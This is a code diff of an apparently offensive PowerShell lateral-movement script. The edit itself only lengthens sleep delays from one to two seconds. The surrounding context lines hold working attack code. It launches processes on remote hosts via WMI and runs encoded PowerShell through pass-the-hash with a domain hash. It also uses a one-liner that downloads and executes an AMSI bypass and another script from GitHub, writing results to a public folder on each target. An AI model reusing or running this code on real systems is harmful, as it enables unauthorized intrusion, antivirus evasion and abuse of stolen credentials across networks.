@@ -1640,7 +1640,7 @@ if($Username){
 				
 				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
 				
-				Start-Sleep 1
+				Start-Sleep 2
 				
 				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 				
@@ -1705,7 +1705,7 @@ if($Username){
 				
 				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
 				
-				Start-Sleep 1
+				Start-Sleep 2
 				
 				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 				
@@ -1771,7 +1771,7 @@ if($Username){
 					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command2"
 					Start-Sleep 1
 					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -Command $FinalCommand"
-					Start-Sleep 1
+					Start-Sleep 2
 					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command3"
 				} -ArgumentList $pwd, $base64command2, $FinalCommand, $base64command3, $SMBExecUsername, $DomainHASH, $_
 			}
@@ -1836,7 +1836,7 @@ if($Username){
 				
 				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
 				
-				Start-Sleep 1
+				Start-Sleep 2
 				
 				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 				
@@ -1907,7 +1907,7 @@ if($Username){
 			
 			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
 			
-			Start-Sleep 1
+			Start-Sleep 2
 			
 			$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 			
@@ -1977,7 +1977,7 @@ else{
 		
 		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
 		
-		Start-Sleep 1
+		Start-Sleep 2
 		
 		$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 		
